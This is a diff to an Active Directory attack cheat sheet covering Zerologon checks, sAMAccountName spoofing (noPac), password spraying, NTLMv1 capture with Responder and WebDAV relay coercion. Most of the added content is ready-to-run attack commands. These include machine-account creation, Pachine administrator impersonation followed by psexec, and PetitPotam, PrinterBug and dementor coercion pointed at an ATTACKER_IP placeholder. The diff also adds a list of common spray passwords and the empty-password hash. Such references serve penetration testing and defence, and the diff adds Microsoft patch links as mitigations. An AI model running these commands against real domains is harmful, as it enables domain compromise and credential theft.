@@ -600,6 +600,11 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
+* `CrackMapExec` - only check
+  ```powershell
+  crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon
+  ```
+
 #### PrintNightmare
 
 > CVE-2021-1675 / CVE-2021-34527
@@ -679,7 +684,20 @@ Requirements:
 > During S4U2Self, the KDC will try to append a '\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a TGS to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid TGS for the domain controller.
 
 **Requirements**
+
 * MachineAccountQuota > 0
+
+**Check for exploitation**
+
+0. Check the MachineAccountQuota of the account
+  ```powershell
+  crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ
+  StandIn.exe --object ms-DS-MachineAccountQuota=*
+  ```
+1. Check if the DC is vulnerable
+  ```powershell
+  crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
+  ```
 
 **Exploitation**
 
@@ -687,13 +705,17 @@ Requirements:
     ```powershell
     impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
 
+    powermad@windows> . .\Powermad.ps1
     powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
     powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
+
+    sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
     ```
 1. Clear the controlled machine account `servicePrincipalName` attribute
     ```ps1
     impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
 
+    powershell@windows> . .\Powerview.ps1
     powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
     ```
 2. (CVE-2021-42278) Change the controlled machine account `sAMAccountName` to a Domain Controller's name without the trailing `$`
@@ -755,9 +777,22 @@ Automated exploitation:
     C:\Windows\system32>whoami                                                        
     nt authority\system 
     ```
+* [Pachine - @ly4k](https://github.com/ly4k/Pachine)
+    ```powershell
+    usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
+                  [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
+                  [domain/]username[:password]
+    $ python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!'
+    $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator 'predator.local/john:Passw0rd!'
+    $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache
+    $ impacket-psexec -k -no-pass 'predator.local/administrator@dc.predator.local'
+    ```
 
 **Mitigations**:
-* KB5008602
+* [KB5007247 - Windows Server 2012 R2](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007247-monthly-rollup-2c3b6017-82f4-4102-b1e2-36f366bf3520)
+* [KB5008601 - Windows Server 2016](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008601-os-build-14393-4771-out-of-band-c8cd33ce-3d40-4853-bee4-a7cc943582b9)
+* [KB5008602 - Windows Server 2019](https://support.microsoft.com/en-us/topic/november-14-2021-kb5008602-os-build-17763-2305-out-of-band-8583a8a3-ebed-4829-b285-356fb5aaacd7)
+* [KB5007205 - Windows Server 2022](https://support.microsoft.com/en-us/topic/november-9-2021-kb5007205-os-build-20348-350-af102e6f-cc7c-4cd4-8dc2-8b08d73d2b31)
 * [KB5008102](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
 * [KB5008380](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)
 
@@ -1245,9 +1280,10 @@ Most of the time the best passwords to spray are :
 
 - `P@ssw0rd01`, `Password123`, `Password1`, `Hello123`, `mimikatz`
 - `Welcome1`/`Welcome01`
-- $Companyname1 :` $Microsoft1`
+- $Companyname1 :`$Microsoft1`
 - SeasonYear : `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
 - Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
+- Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)
 
 
 #### Kerberos pre-auth bruteforcing
@@ -1853,7 +1889,7 @@ root@kali:~$ klist
 * LmCompatibilityLevel = 0x1: Send LM & NTLM (`reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v lmcompatibilitylevel`)
 
 **Exploitation**:
-* Capturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical **1122334455667788** challenge
+* Capturing using Responder: Edit the `/etc/responder/Responder.conf` file to include the magical **1122334455667788** challenge
     ```ps1
     HTTPS = On
     DNS = On
@@ -1863,7 +1899,7 @@ root@kali:~$ klist
     ; Use "Random" for generating a random challenge for each requests (Default)
     Challenge = 1122334455667788
     ```
-* Fire Responder: `responder -I eth0 --lm`
+* Fire Responder: `responder -I eth0 --lm`, if `--disable-ess` is set, extended session security will be disabled for NTLMv1 authentication
 * Force a callback:
     ```ps1
     PetitPotam.exe Responder-IP DC-IP # Patched around August 2021
@@ -2108,7 +2144,7 @@ secretsdump.py -k -no-pass target.lab.local
 
 #### Relaying with WebDav Trick
 
-> Example of exploitation where you can coerce machine accounts to authenticate to a host annd combine it with Resource Based Constrained Delegation to gain elevated access.
+> Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB
 
 **Requirement**:
 *  WebClient service
@@ -2117,8 +2153,23 @@ secretsdump.py -k -no-pass target.lab.local
 * Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
 * Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
 * Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
-* Discover WebDAV using [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus): `GetWebDAVStatus.exe 10.0.0.4`
-* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/pentestlab 10.0.0.4`
+* Discover WebDAV services
+    ```ps1
+    webclientservicescanner 'domain.local'/'user':'password'@'machine'
+    crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
+    GetWebDAVStatus.exe 'machine'
+    ```
+* Trigger the authentication to relay to our nltmrelayx: `PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4`, the listener host must be specified with the FQDN or full netbios name like `logger.domain.local@80/test.txt`. Specifying the IP results in anonymous auth instead of System. 
+  ```ps1
+  # PrinterBug
+  dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+  SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
+
+  # PetitPotam
+  Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+  Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+  PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
+  ```
 * Use the created account to ask for a service ticket: 
     ```ps1
     .\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
@@ -2224,7 +2275,7 @@ Require [Impacket PR #1101](https://github.com/SecureAuthCorp/impacket/pull/1101
     # Mimikatz
     mimikatz> lsadump::dcsync /user:krbtgt
     ```
-* Version 3: ADCSPwn
+* Version 3: ADCSPwn - Require `WebClient` service running on the domain controller. By default this service is not installed.
     ```powershell
     https://github.com/bats3c/ADCSPwn
     adcspwn.exe --adcs <cs server> --port [local port] --remote [computer]
@@ -3348,3 +3399,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
 * [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
 * [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
+* [WebDAV, NTLM & Responder - Didier Stevens - Monday 20 May 2019](https://blog.didierstevens.com/2019/05/20/webdav-ntlm-responder/)
